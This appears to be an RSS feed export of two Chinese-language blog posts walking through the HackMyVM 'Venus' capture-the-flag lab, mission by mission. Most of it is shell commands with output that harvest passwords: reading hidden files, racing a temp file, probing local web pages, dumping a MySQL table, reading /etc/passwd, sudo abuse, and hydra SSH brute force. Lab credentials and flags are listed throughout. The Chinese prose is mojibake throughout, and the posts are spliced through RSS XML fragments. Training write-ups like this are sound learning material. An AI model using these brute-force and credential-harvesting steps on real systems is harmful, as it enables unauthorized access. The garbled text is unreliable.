1.  Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÁöÑÊ†áÂáÜÊñπÊ≥ïÊòØÂÖàÂØπÊñá‰ª∂ÂÜÖÂÆπËøõË°åÊéíÂ∫èÔºåÁÑ∂Âêé‰ΩøÁî® `uniq -u` ÂëΩ‰ª§ÊâæÂá∫Âè™Âá∫Áé∞‰∏ÄÊ¨°ÁöÑË°å„ÄÇ

    ```bash
    isabel@venus:~$ sort different.txt | uniq -u
    EEDyYFDwYsmYawj
    ```

2.  ÂàáÊç¢Âà∞ `freya` Áî®Êà∑„ÄÇ

    ```bash
    isabel@venus:~$ su freya
    Password: EEDyYFDwYsmYawj
    ```

---

## **Mission 0x25: freya -&gt; alexa**

-   **‰ªªÂä°**: Áî®Êà∑ `alexa` ÊØèÂàÜÈíü‰ºöÂú® `/free` ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´ÂØÜÁ†ÅÁöÑ `.txt` Êñá‰ª∂ÔºåÁÑ∂ÂêéÁ´ãÂç≥Âà†Èô§ÂÆÉ„ÄÇ

1.  ËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÁ´ûÊÄÅÊù°‰ª∂ÈóÆÈ¢ò„ÄÇÊàë‰ª¨ÈúÄË¶ÅÊåÅÁª≠ÁõëÊéßÁõÆÊ†áÁõÆÂΩïÔºåÂπ∂Âú®Êñá‰ª∂Âá∫Áé∞Êó∂ËøÖÈÄüËØªÂèñÂÖ∂ÂÜÖÂÆπ„ÄÇ

2.  ‰ΩøÁî®‰∏Ä‰∏™ `while` Âæ™ÁéØÊù•‰∏çÊñ≠Â∞ùËØïËØªÂèñ `/free` ÁõÆÂΩï‰∏ãÁöÑ `.txt` Êñá‰ª∂ÔºàÊ†πÊçÆ `ls` ÂèëÁé∞Êñá‰ª∂Âêç‰∏∫ `beer.txt`Ôºâ„ÄÇ

    ```bash
    freya@venus:/free$ while true; do cat *.txt 2&gt;/dev/null; sleep 0.1; done
    mxq9O3MSxxX9Q3S
    ```

3.  ÊàêÂäüÊçïËé∑Âà∞ÂØÜÁ†ÅÂêéÔºåÂàáÊç¢Âà∞ `alexa` Áî®Êà∑„ÄÇ

    ```bash
    freya@venus:/free$ su alexa
    Password: mxq9O3MSxxX9Q3S
    ```

---

## **Mission 0x26: alexa -&gt; ariel**

-   **‰ªªÂä°**: Áî®Êà∑ `ariel` ÁöÑÂØÜÁ†ÅÂú®Á∫ø (HTTP)„ÄÇ

1.  Ëøô‰∏™ÊèêÁ§∫ÊÑèÂë≥ÁùÄÂØÜÁ†ÅÂèØ‰ª•ÈÄöËøáËÆøÈóÆÊú¨Âú∞ÁöÑ Web ÊúçÂä°Ëé∑Âèñ„ÄÇ‰ΩøÁî® `curl` ÂëΩ‰ª§ËØ∑Ê±Ç `127.0.0.1`„ÄÇ

    ```bash
    alexa@venus:~$ curl 127.0.0.1
    33EtHoz9a0w2Yqo
    ```

2.  Áõ¥Êé•ÂæóÂà∞‰∫ÜÂØÜÁ†ÅÔºåÂàáÊç¢Âà∞ `ariel` Áî®Êà∑„ÄÇ

    ```bash
    alexa@venus:~$ su ariel
    Password: 33EtHoz9a0w2Yqo
    ```

---

## **Mission 0x27: ariel -&gt; lola**

-   **‰ªªÂä°**: `ariel` Ê≤°Êù•ÂæóÂèä‰øùÂ≠ò `lola` ÁöÑÂØÜÁ†ÅÔºå‰ΩÜÁïô‰∏ã‰∫Ü‰∏Ä‰∏™‰∏¥Êó∂Êñá‰ª∂ `.goas.swp`„ÄÇ

1.  `.swp` Êñá‰ª∂ÊòØ Vim ÁºñËæëÂô®ÁöÑ‰∫§Êç¢Êñá‰ª∂„ÄÇ‰ΩøÁî® `strings` ÂëΩ‰ª§ÂèØ‰ª•‰ªé‰∏≠ÊèêÂèñÂèØÊâìÂç∞ÁöÑÂ≠óÁ¨¶ÔºåÈÄöÂ∏∏ËÉΩÊâæÂà∞ÊúâÁî®ÁöÑ‰ø°ÊÅØ„ÄÇ

    ```bash
    ariel@venus:~$ strings .goas.swp
    # ... (ÈÉ®ÂàÜËæìÂá∫)
    --&gt;VVjqJGRrnfKmcgD
    --&gt;bnQgcXYamhSDSff
    --&gt;QsymOOVbzSaKmRm
    # ... (Êõ¥Â§öÂØÜÁ†Å)
    --&gt;ppkJjqYvSCIyAhK
    Thats my little DIc with my old and current passw0rds:
    ```

2.  Êñá‰ª∂ÂÜÖÂÆπÊòØ‰∏Ä‰∏™ÂØÜÁ†ÅÂàóË°®„ÄÇÁî±‰∫éÊó†Ê≥ïÁ°ÆÂÆöÂì™‰∏Ä‰∏™ÊòØÊ≠£Á°ÆÁöÑÔºåÈúÄË¶ÅÂ∞ÜÂàóË°®Â§çÂà∂Âà∞Êú¨Âú∞Ôºå‰ΩøÁî® `hydra` Á≠âÂ∑•ÂÖ∑ÂØπ `lola` Áî®Êà∑ÁöÑ SSH ÊúçÂä°ËøõË°åÁàÜÁ†¥„ÄÇ

    ```bash
    # Âú®Êú¨Âú∞KaliÁ≥ªÁªü‰∏äÊâßË°åÔºå'pass'Êñá‰ª∂ÂåÖÂê´‰ªé.swpÊñá‰ª∂‰∏≠ÊèêÂèñÁöÑÂØÜÁ†ÅÂàóË°®
    hydra -l lola -P pass ssh://venus.hackmyvm.eu:5000 -t 64
    ```

3.  Hydra ÂæàÂø´ÊâæÂà∞‰∫ÜÊ≠£Á°ÆÁöÑÂØÜÁ†Å `d3LieOzRGX5wud6`„ÄÇ‰ΩøÁî®ËØ•ÂØÜÁ†ÅÁôªÂΩï `lola` Ë¥¶Êà∑„ÄÇ

---

## **Mission 0x28: lola -&gt; celeste**

-   **‰ªªÂä°**: Áî®Êà∑ `celeste` Áïô‰∏ã‰∫Ü‰∏Ä‰∏™Êñá‰ª∂ÂêçÂàóË°® `pages.txt`ÔºåÂ•πÁöÑÂØÜÁ†ÅÂèØËÉΩÂú®ÂÖ∂‰∏≠‰∏Ä‰∏™ `.html` È°µÈù¢Èáå„ÄÇ

1.  ‰∏é Mission 23 Á±ª‰ººÔºåÈúÄË¶ÅÁºñÂÜôËÑöÊú¨Êù•ÊµãËØï `pages.txt` ‰∏≠ÁöÑÊâÄÊúâÂèØËÉΩÊÄß„ÄÇËøôÊ¨°ÊòØÊ£ÄÊü•Âì™‰∏™È°µÈù¢Âú®Êú¨Âú∞ Web ÊúçÂä°Âô®‰∏äÂ≠òÂú®„ÄÇ

2.  ‰ΩøÁî® `while` Âæ™ÁéØËØªÂèñÂàóË°®ÔºåÂπ∂ÈÄöËøá `curl` Ê£ÄÊü•ÊØè‰∏™È°µÈù¢ÁöÑ HTTP Áä∂ÊÄÅÁ†Å„ÄÇ

    ```bash
    lola@venus:~$ while read p; do code=$(curl -s -o /dev/null -w '%{http_code}' 'http://127.0.0.1/$p.html'); if [ '$code' == '200' ]; then echo 'Found: $p.html'; fi; done &lt; pages.txt
    Found: cebolla.html
    ```

3.  ÊâæÂà∞‰∫ÜËøîÂõû `200 OK` ÁöÑÈ°µÈù¢ `cebolla.html`„ÄÇËÆøÈóÆËØ•È°µÈù¢Ëé∑ÂèñÂØÜÁ†Å„ÄÇ

    ```bash
    lola@venus:~$ curl 127.0.0.1/cebolla.html
    VLSNMTKwSV2o8Tn
    ```

4.  ÂàáÊç¢Âà∞ `celeste` Áî®Êà∑„ÄÇ

    ```bash
    lola@venus:~$ su celeste
    Password: VLSNMTKwSV2o8Tn
    ```

---

## **Mission 0x29: celeste -&gt; nina**

-   **‰ªªÂä°**: Áî®Êà∑ `celeste` ÂèØ‰ª•ËÆøÈóÆ MySQLÔºå‰ΩÜÊúâ‰ªÄ‰πàÁî®Âë¢Ôºü

1.  ‰ΩøÁî® `celeste` ÂΩìÂâçÁöÑÂØÜÁ†ÅÂ∞ùËØïÁôªÂΩï MySQL Êï∞ÊçÆÂ∫ì„ÄÇ

    ```bash
    celeste@venus:~$ mysql -u celeste -pVLSNMTKwSV2o8Tn
    ```

2.  ÁôªÂΩïÊàêÂäüÂêéÔºåÊü•ËØ¢Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑ‰ø°ÊÅØ„ÄÇ
    ```sql
    MariaDB [(none)]&gt; SHOW DATABASES;
    MariaDB [(none)]&gt; USE venus;
    MariaDB [venus]&gt; SHOW TABLES;
    MariaDB [venus]&gt; SELECT * FROM people;
    ```

3.  `people` Ë°®‰∏≠ÂåÖÂê´Â§ßÈáèÁî®Êà∑ÂêçÂíåÂØÜÁ†Å„ÄÇÂÖ∂‰∏≠Ôºå`id_people=35` ÁöÑ `pazz` Â≠óÊÆµÊòØ‰∏Ä‰∏™ÈöêËóè Flag„ÄÇÂêåÊó∂Ôºå`id_people=74` ÁöÑ `nina` Áî®Êà∑Âá≠ËØÅÁúãËµ∑Êù•ÂæàÊúâÂ∏åÊúõ„ÄÇ

4.  Â∞ÜÊâÄÊúâÂá≠ËØÅÂ§çÂà∂Âà∞Êú¨Âú∞ÔºåÂÜçÊ¨°‰ΩøÁî® `hydra` ÁàÜÁ†¥ SSHÔºåÊúÄÁªàÁ°ÆËÆ§ `nina` ÁöÑÂØÜÁ†Å„ÄÇ
    ```bash
    # Âú®Êú¨Âú∞KaliÁ≥ªÁªü‰∏äÊâßË°åÔºå'db_pass.txt'‰∏∫‰ªéÊï∞ÊçÆÂ∫ìÂØºÂá∫ÁöÑuser:passÊñá‰ª∂
    hydra -C db_pass.txt ssh://venus.hackmyvm.eu:5000
    # ...
    # [5000][ssh] host: venus.hackmyvm.eu   login: nina   password: ixpeqdWuvC5N9kG
    ```

5.  ‰ΩøÁî®ÊâæÂà∞ÁöÑÂØÜÁ†Å `ixpeqdWuvC5N9kG` ÁôªÂΩï `nina` Ë¥¶Êà∑„ÄÇ

---

## **Mission 0x30: nina -&gt; kira**

-   **‰ªªÂä°**: Áî®Êà∑ `kira` Âú® `http://localhost/method.php` Ëóè‰∫Ü‰∏úË•ø„ÄÇ

1.  Êñá‰ª∂Âêç `method.php` ÊöóÁ§∫ÈúÄË¶ÅÊµãËØï‰∏çÂêåÁöÑ HTTP ËØ∑Ê±ÇÊñπÊ≥ï„ÄÇ

2.  ‰ΩøÁî® `for` Âæ™ÁéØÊµãËØïÂ∏∏Áî®ÁöÑ HTTP ÊñπÊ≥ïÔºåÂπ∂ËßÇÂØüÂìçÂ∫î„ÄÇ

    ```bash
    nina@venus:~$ for method in GET POST PUT DELETE PATCH OPTIONS; do echo -n '[$method] -&gt; '; curl -s -X '$method' http://localhost/method.php; done
    [GET] -&gt; I dont like this method!
    [POST] -&gt; I dont like this method!
    [PUT] -&gt; tPlqxSKuT4eP3yr
    [DELETE] -&gt; I dont like this method!
    [PATCH] -&gt; I dont like this method!
    [OPTIONS] -&gt; I dont like this method!
    ```

3.  ÂèëÁé∞‰ΩøÁî® `PUT` ÊñπÊ≥ïÊó∂ÔºåÊúçÂä°Âô®ËøîÂõû‰∫ÜÂØÜÁ†Å„ÄÇ

4.  ÂàáÊç¢Âà∞ `kira` Áî®Êà∑„ÄÇ

    ```bash
    nina@venus:~$ su kira
    Password: tPlqxSKuT4eP3yr
    ```

---

# **Flag  **

```
22. lucia:         8===5Sr2pqeVTmn8RaaPmTPE===D~~
23. isabel:        8===Md2CU83GtVfouhm9U0AS===D~~
24. freya:         8===m1rRSv2pdm3sBGmgidul===D~~
25. alexa:         8===12ALP3eLlJ1GrTBxwJQM===D~~
26. ariel:         8===lqTeJ1msxhNjNJCptxmZ===D~~
27. lola:          8===TMYRw853hx8yKRocFMgM===D~~
28. celeste:       8===TrdsvMy99slFZtd4Cy4Q===D~~
29. nina:          8===VwICIymoA1DczWJau1sG===D~~
30. kira:          8===rJun2WyeuGIvabWQvJko===D~~

Hidden Flags:
- (Mission 23)   8===CISqRtRjnvQbzcRWfCqe===D~~
- (Mission 29)   8===xKmPDsJSKpHLzkqKXyjx===D~~
```

# Pass

```
22: lucia/uvMwFDQrQWPMeGP
23: isabel/H5ol8Z2mrRsorC0
24: freya/EEDyYFDwYsmYawj
25: alexa/mxq9O3MSxxX9Q3S
26: ariel/33EtHoz9a0w2Yqo
27: lola/d3LieOzRGX5wud6
28: celeste/VLSNMTKwSV2o8Tn
29: nina/ixpeqdWuvC5N9kG
30: kira/tPlqxSKuT4eP3yr
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus22to30.html</guid><pubDate>Wed, 06 Aug 2025 00:54:45 +0000</pubDate></item><item><title>hmv_Labs_venus1to21</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus1to21.html</link><description># **ÁÆÄ‰ªã**

Venus ÊòØ HackMyVM.eu Êé®Âá∫ÁöÑ‰∏Ä‰∏™ÈÄÇÂêàÂàùÂ≠¶ËÄÖÁöÑ CTFÔºàÂ§∫ÊóóËµõÔºâÈù∂Êú∫„ÄÇÊú¨ÊîªÁï•Â∞ÜËÆ∞ÂΩï‰ªéÂàùÂßãÁî®Êà∑ `hacker` ÂºÄÂßãÔºåÈÄöËøáËß£ÂÜ≥‰∏ÄÁ≥ªÂàóË∞úÈ¢òÔºåÈÄêÊ≠•ÊèêÊùÉÔºåÊúÄÁªàËé∑ÂèñÂà∞VhiddenÂ•ñÊùØÁöÑÂÖ®ËøáÁ®ã„ÄÇ

---

# ÂºÄÊâì

## **Mission 0x01: hacker -&gt; sophia**

- **‰ªªÂä°**: Áî®Êà∑ `sophia` ÁöÑÂØÜÁ†Å‰øùÂ≠òÂú®ÂΩìÂâçÁõÆÂΩïÁöÑ‰∏Ä‰∏™ÈöêËóèÊñá‰ª∂‰∏≠„ÄÇ

1.  È¶ñÂÖàÔºå‰ΩøÁî® `ls -al` ÂëΩ‰ª§Êü•ÊâæÊâÄÊúâÊñá‰ª∂ÔºåÂåÖÊã¨ÈöêËóèÊñá‰ª∂„ÄÇ

    ```bash
    hacker@venus:~$ ls -al
    total 40
    drwxr-x--- 1 root   hacker 4096 Apr  5  2024 .
    drwxr-xr-x 1 root   root   4096 Apr  5  2024 ..
    -rw-r----- 1 root   hacker   31 Apr  5  2024 ...
    -rw-r--r-- 1 hacker hacker  220 Apr 23  2023 .bash_logout
    -rwxr-xr-x 1 hacker hacker 3653 Jul 24 00:48 .bashrc
    -rw-r----- 1 root   hacker   16 Apr  5  2024 .myhiddenpazz
    -rw-r--r-- 1 hacker hacker    0 Jun 20 00:35 .profile
    -rw-r----- 1 root   hacker  287 Apr  5  2024 mission.txt
    -rw-r----- 1 root   hacker 2542 Apr  5  2024 readme.txt
    ```

2.  ÂèëÁé∞ÂèØÁñëÈöêËóèÊñá‰ª∂ `.myhiddenpazz`ÔºåËØªÂèñÂÜÖÂÆπÂæóÂà∞ÂØÜÁ†Å„ÄÇ

    ```bash
    hacker@venus:~$ cat .myhiddenpazz
    Y1o645M3mR84ejc
    ```

3.  ÂàáÊç¢Âà∞ `sophia` Áî®Êà∑„ÄÇ

    ```bash
    hacker@venus:~$ su sophia
    Password: Y1o645M3mR84ejc
    ```

---

## **Mission 0x02: sophia -&gt; angela**
- **‰ªªÂä°**: Áî®Êà∑ `angela` ÁöÑÂØÜÁ†ÅÂú®‰∏Ä‰∏™Âêç‰∏∫ `whereismypazz.txt` ÁöÑÊñá‰ª∂‰∏≠Ôºå‰ΩÜÂ•πÂøòËÆ∞‰∫ÜÊñá‰ª∂‰ΩçÁΩÆ„ÄÇ

1.  ‰ΩøÁî® `find` ÂëΩ‰ª§Âú®Êï¥‰∏™Êñá‰ª∂Á≥ªÁªü‰∏≠ÊêúÁ¥¢ËØ•Êñá‰ª∂„ÄÇ

    ```bash
    sophia@venus:~$ find / -name 'whereismypazz.txt' 2&gt;/dev/null
    /usr/share/whereismypazz.txt
    ```

2.  ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÂæóÂà∞ÂØÜÁ†Å„ÄÇ

    ```bash
    sophia@venus:~$ cat /usr/share/whereismypazz.txt
    oh5p9gAABugHBje
    ```

3.  ÂàáÊç¢Âà∞ `angela` Áî®Êà∑„ÄÇ

    ```bash
    sophia@venus:~$ su angela
    Password: oh5p9gAABugHBje
    ```

---

## **Mission 0x03: angela -&gt; emma**
- **‰ªªÂä°**: Áî®Êà∑ `emma` ÁöÑÂØÜÁ†ÅÂú® `findme.txt` Êñá‰ª∂ÁöÑÁ¨¨ 4069 Ë°å„ÄÇ

1.  ‰ΩøÁî® `sed` ÂëΩ‰ª§Áõ¥Êé•ÊâìÂç∞ÊåáÂÆöË°å„ÄÇ

    ```bash
    angela@venus:~$ sed -n '4069p' findme.txt
    fIvltaGaq0OUH8O
    ```

2.  ÂàáÊç¢Âà∞ `emma` Áî®Êà∑„ÄÇ

    ```bash
    angela@venus:~$ su emma
    Password: fIvltaGaq0OUH8O
    ```

---

## **Mission 0x04: emma -&gt; mia**
- **‰ªªÂä°**: Áî®Êà∑ `mia` ÁöÑÂØÜÁ†ÅÂú®Âêç‰∏∫ `-` ÁöÑÊñá‰ª∂‰∏≠„ÄÇ

1.  Áî±‰∫éÊñá‰ª∂ÂêçÊòØÁâπÊÆäÂ≠óÁ¨¶Ôºå‰ΩøÁî® `./-` Êù•ÊåáÂÆöÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑËØ•Êñá‰ª∂„ÄÇ

    ```bash
    emma@venus:~$ cat ./-
    iKXIYg0pyEH2Hos
    ```

2.  ÂàáÊç¢Âà∞ `mia` Áî®Êà∑„ÄÇ

    ```bash
    emma@venus:~$ su mia
    Password: iKXIYg0pyEH2Hos
    ```

---

## **Mission 0x05: mia -&gt; camila**
- **‰ªªÂä°**: Áî®Êà∑ `camila` ÁöÑÂØÜÁ†ÅÂú®Âêç‰∏∫ `hereiam` ÁöÑÊñá‰ª∂Â§πÂÜÖ„ÄÇ

1.  È¶ñÂÖàÊâæÂà∞ `hereiam` Êñá‰ª∂Â§πÁöÑ‰ΩçÁΩÆ„ÄÇ

    ```bash
    mia@venus:~$ find / -name 'hereiam' 2&gt;/dev/null
    /opt/hereiam
    ```

2.  ËøõÂÖ•ËØ•ÁõÆÂΩïÂπ∂Êü•ÊâæÈáåÈù¢ÁöÑÈöêËóèÊñá‰ª∂„ÄÇ

    ```bash
    mia@venus:/opt/hereiam$ ls -la
    total 12
    drwxr-xr-x 2 root root 4096 Apr  5  2024 .
    drwxr-xr-x 1 root root 4096 Apr  5  2024 ..
    -rw-r--r-- 1 root root   16 Apr  5  2024 .here
    
    mia@venus:/opt/hereiam$ cat .here
    F67aDmCAAgOOaOc
    ```

3.  ÂàáÊç¢Âà∞ `camila` Áî®Êà∑„ÄÇ

    ```bash
    mia@venus:/opt/hereiam$ su camila
    Password: F67aDmCAAgOOaOc
    ```

---

## **Mission 0x06: camila -&gt; luna**
- **‰ªªÂä°**: Áî®Êà∑ `luna` ÁöÑÂØÜÁ†ÅÂú® `muack` Êñá‰ª∂Â§πÂÜÖÁöÑÊüê‰∏™Êñá‰ª∂‰∏≠„ÄÇ

1.  `muack` Êñá‰ª∂Â§πÂÜÖÊñá‰ª∂‰ºóÂ§öÔºå‰ΩøÁî® `find` Âíå `file` ÂëΩ‰ª§ÁªÑÂêàÔºåÊâæÂà∞Á±ªÂûã‰∏∫ `ASCII text` ÁöÑÂ∏∏ËßÑÊñá‰ª∂„ÄÇ

    ```bash
    camila@venus:~/muack$ find . -type f -exec file {} \; | grep 'text'
    ./111/111/muack: ASCII text
    ```

2.  ËØªÂèñÊâæÂà∞ÁöÑÊñá‰ª∂„ÄÇ

    ```bash
    camila@venus:~/muack$ cat ./111/111/muack
    j3vkuoKQwvbhkMc
    ```

3.  ÂàáÊç¢Âà∞ `luna` Áî®Êà∑„ÄÇ

    ```bash
    camila@venus:~/muack$ su luna
    Password: j3vkuoKQwvbhkMc
    ```

---

## **Mission 0x07: luna -&gt; eleanor**
- **‰ªªÂä°**: Áî®Êà∑ `eleanor` ÁöÑÂØÜÁ†ÅÂú®‰∏Ä‰∏™Âç†Áî® 6969 Â≠óËäÇÁöÑÊñá‰ª∂‰∏≠„ÄÇ

1.  ‰ΩøÁî® `find` ÂëΩ‰ª§ÁöÑ `-size` ÂèÇÊï∞Êü•ÊâæÁâπÂÆöÂ§ßÂ∞èÁöÑÊñá‰ª∂„ÄÇ

    ```bash
    luna@venus:~$ find / -type f -size 6969c 2&gt;/dev/null
    /usr/share/moon.txt
    ```

2.  ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ

    ```bash
    luna@venus:~$ cat /usr/share/moon.txt
    UNDchvln6Bmtu7b
    ```

3.  ÂàáÊç¢Âà∞ `eleanor` Áî®Êà∑„ÄÇ

    ```bash
    luna@venus:~$ su eleanor
    Password: UNDchvln6Bmtu7b
    ```

---

## **Mission 0x08: eleanor -&gt; victoria**
- **‰ªªÂä°**: Áî®Êà∑ `victoria` ÁöÑÂØÜÁ†ÅÊâÄÂú®Êñá‰ª∂ÁöÑÊâÄÊúâËÄÖÊòØ `violin`„ÄÇ

1.  ‰ΩøÁî® `find` ÂëΩ‰ª§ÁöÑ `-user` ÂèÇÊï∞Êü•ÊâæÂ±û‰∫éÁâπÂÆöÁî®Êà∑ÁöÑÊñá‰ª∂„ÄÇ

    ```bash
    eleanor@venus:~$ find / -user violin 2&gt;/dev/null
    /usr/local/games/yo
    ```

2.  ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ

    ```bash
    eleanor@venus:~$ cat /usr/local/games/yo
    pz8OqvJBFxH0cSj
    ```

3.  ÂàáÊç¢Âà∞ `victoria` Áî®Êà∑„ÄÇ

    ```bash
    eleanor@venus:~$ su victoria
    Password: pz8OqvJBFxH0cSj
    ```

---

## **Mission 0x09: victoria -&gt; isla**
- **‰ªªÂä°**: Áî®Êà∑ `isla` ÁöÑÂØÜÁ†ÅÂú®‰∏Ä‰∏™ zip Êñá‰ª∂‰∏≠„ÄÇ

1.  ÁõÆÊ†áÁ≥ªÁªüÊó†Ê≥ïÂÜôÂÖ•Êñá‰ª∂ÔºåÂÖàÂ∞Ü `passw0rd.zip` Êñá‰ª∂ÂÜÖÂÆπÁî® `base64` ÁºñÁ†ÅÂêéÂ§çÂà∂Âá∫Êù•„ÄÇ

    ```bash
    victoria@venus:~$ base64 passw0rd.zip
    UEsDBAoAAAAAAIMzhViqg0LgEAAAABAAAAAbABwAcHduZWQvdmljdG9yaWEvcGFzc3cwcmQudHh0
    VVQJAAP2mQ9m9pkPZnV4CwABBAAAAAAEAAAAAEQzWFRvYjBGVUltc29CYgpQSwECHgMKAAAAAACD
    M4VYqoNC4BAAAAAQAAAAGwAYAAAAAAABAAAApIEAAAAAcHduZWQvdmljdG9yaWEvcGFzc3cwcmQu
    dHh0VVQFAAP2mQ9mdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAYQAAAGUAAAAAAA==
    ```

2.  Âú®Êú¨Âú∞Êú∫Âô®‰∏äËß£Á†ÅÂπ∂Ëß£Âéã„ÄÇ

    ```bash
    # Âú®Êú¨Âú∞KaliÁ≥ªÁªü‰∏äÊâßË°å
    echo '...' | base64 -d &gt; passw0rd.zip
    unzip passw0rd.zip
    cat pwned/victoria/passw0rd.txt
    D3XTob0FUImsoBb
    ```

3.  ÂàáÊç¢Âà∞ `isla` Áî®Êà∑„ÄÇ

    ```bash
    victoria@venus:~$ su isla
    Password: D3XTob0FUImsoBb
    ```

---

## **Mission 0x10: isla -&gt; violet**
- **‰ªªÂä°**: Áî®Êà∑ `violet` ÁöÑÂØÜÁ†ÅÂú® `passy` Êñá‰ª∂‰∏≠‰ª• `a9HFX` ÂºÄÂ§¥ÁöÑË°åÔºå‰ΩÜËøô 5 ‰∏™Â≠óÁ¨¶‰∏çÊòØÂØÜÁ†ÅÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇ

1.  ‰ΩøÁî® `grep` Êü•ÊâæÂåÖÂê´ `a9HFX` ÁöÑË°åÔºåÂπ∂ÊâãÂä®ÂéªÈô§ÂâçÁºÄ„ÄÇ

    ```bash
    isla@venus:~$ grep 'a9HFX' passy
    # ... (Â§öË°åËæìÂá∫)
    a9HFXWKINVzNQLKLDVAc 
    ```
    ÂØÜÁ†ÅÊòØ `WKINVzNQLKLDVAc`„ÄÇ

2.  ÂàáÊç¢Âà∞ `violet` Áî®Êà∑„ÄÇ

    ```bash
    isla@venus:~$ su violet
    Password: WKINVzNQLKLDVAc
    ```

---

## **Mission 0x11: violet -&gt; lucy**
- **‰ªªÂä°**: Áî®Êà∑ `lucy` ÁöÑÂØÜÁ†ÅÂú® `end` Êñá‰ª∂‰∏≠‰ª• `0JuAZ` ÁªìÂ∞æÁöÑË°åÔºå‰ΩÜËøô 5 ‰∏™Â≠óÁ¨¶‰∏çÊòØÂØÜÁ†ÅÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇ

1. ‰ΩøÁî® `grep` Êü•ÊâæËØ•Ë°åÔºåÂπ∂ÊâãÂä®ÂéªÈô§ÂêéÁºÄ„ÄÇ

   ```bash
   violet@venus:~$ grep '0JuAZ' end
   OCmMUjebG53giud0JuAZ
   ```

   ÂØÜÁ†ÅÊòØ `OCmMUjebG53giud`„ÄÇ

1. ÂàáÊç¢Âà∞ `lucy` Áî®Êà∑„ÄÇ

   ```bash
   violet@venus:~$ su lucy
   Password: OCmMUjebG53giud
   ```

---

## **Mission 0x12: lucy -&gt; elena**
- **‰ªªÂä°**: Áî®Êà∑ `elena` ÁöÑÂØÜÁ†ÅÂú® `file.yo` Êñá‰ª∂‰∏≠‰Ωç‰∫é `fu` Âíå `ck` ‰πãÈó¥„ÄÇ

1.  ‰ΩøÁî® `grep -o` Êù•‰ªÖÊèêÂèñÂåπÈÖçÁöÑÈÉ®ÂàÜ„ÄÇ

    ```bash
    lucy@venus:~$ grep -o 'fu.*ck' file.yo
    fu4xZ5lIKYmfPLg9tck
    ```
    ÂØÜÁ†ÅÊòØ `4xZ5lIKYmfPLg9t`„ÄÇ

2.  ÂàáÊç¢Âà∞ `elena` Áî®Êà∑„ÄÇ

    ```bash
    lucy@venus:~$ su elena
    Password: 4xZ5lIKYmfPLg9t
    ```

---

## **Mission 0x13: elena -&gt; alice**
- **‰ªªÂä°**: Áî®Êà∑ `alice` ÁöÑÂØÜÁ†ÅÂú®‰∏Ä‰∏™ÁéØÂ¢ÉÂèòÈáè‰∏≠„ÄÇ

1.  ‰ΩøÁî® `env` ÂëΩ‰ª§Êü•ÁúãÊâÄÊúâÁéØÂ¢ÉÂèòÈáè„ÄÇ

    ```bash
    elena@venus:~$ env
    # ... (ÁúÅÁï•ÈÉ®ÂàÜËæìÂá∫)
    PASS=Cgecy2MY2MWbaqt
    # ...
    ```

2.  ÂàáÊç¢Âà∞ `alice` Áî®Êà∑„ÄÇ

    ```bash
    elena@venus:~$ su alice
    Password: Cgecy2MY2MWbaqt
    ```

---

## **Mission 0x14: alice -&gt; anna**
- **‰ªªÂä°**: `anna` ÁöÑÂØÜÁ†Å‰Ωú‰∏∫Ê≥®ÈáäÁïôÂú®‰∫Ü `/etc/passwd` Êñá‰ª∂‰∏≠„ÄÇ

1.  Êü•Áúã `/etc/passwd` Êñá‰ª∂ÔºåÊ≥®ÊÑè `alice` Áî®Êà∑Ë°åÁöÑÊ≥®ÈáäÂ≠óÊÆµ„ÄÇ

    ```bash
    alice@venus:~$ cat /etc/passwd
    # ...
    alice:x:1014:1014:w8NvY27qkpdePox:/pwned/alice:/bin/bash
    anna:x:1015:1015::/pwned/anna:/bin/bash
    # ...
    ```
    Âú® `alice` Áî®Êà∑Ë°åÁöÑÁ¨¨‰∫î‰∏™Â≠óÊÆµÔºàÊ≥®ÈáäÂ≠óÊÆµÔºâÊâæÂà∞‰∫Ü `anna` ÁöÑÂØÜÁ†Å `w8NvY27qkpdePox`„ÄÇ

2.  ÂàáÊç¢Âà∞ `anna` Áî®Êà∑„ÄÇ

    ```bash
    alice@venus:~$ su anna
    Password: w8NvY27qkpdePox
    ```

---

## **Mission 0x15: anna -&gt; natalia**
- **‰ªªÂä°**: ‰ΩøÁî® `sudo` Êàê‰∏∫ `natalia` Áî®Êà∑„ÄÇ

1.  È¶ñÂÖàÊ£ÄÊü• `sudo` ÊùÉÈôê„ÄÇ

    ```bash
    anna@venus:~$ sudo -l
    User anna may run the following commands on venus:
        (natalia) NOPASSWD: /bin/bash
    ```

2.  ÂèëÁé∞ÂèØ‰ª•ÂÖçÂØÜ‰ª• `natalia` ÁöÑË∫´‰ªΩÊâßË°å `/bin/bash`ÔºåÁõ¥Êé•ÊèêÊùÉ„ÄÇ

    ```bash
    anna@venus:~$ sudo -u natalia /bin/bash
    natalia@venus:/pwned/anna$
    ```

---

## **Mission 0x16: natalia -&gt; eva**
- **‰ªªÂä°**: `eva` ÁöÑÂØÜÁ†ÅË¢´ÁºñÁ†ÅÂú® `base64.txt` Êñá‰ª∂‰∏≠„ÄÇ

1.  ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÂπ∂ÈÄöËøá `base64 -d` Ëß£Á†Å„ÄÇ

    ```bash
    natalia@venus:~$ cat base64.txt | base64 -d
    upsCA3UFu10fDAO
    ```

2.  ÂàáÊç¢Âà∞ `eva` Áî®Êà∑„ÄÇ

    ```bash
    natalia@venus:~$ su eva
    Password: upsCA3UFu10fDAO
    ```

---

## **Mission 0x17: eva -&gt; clara**
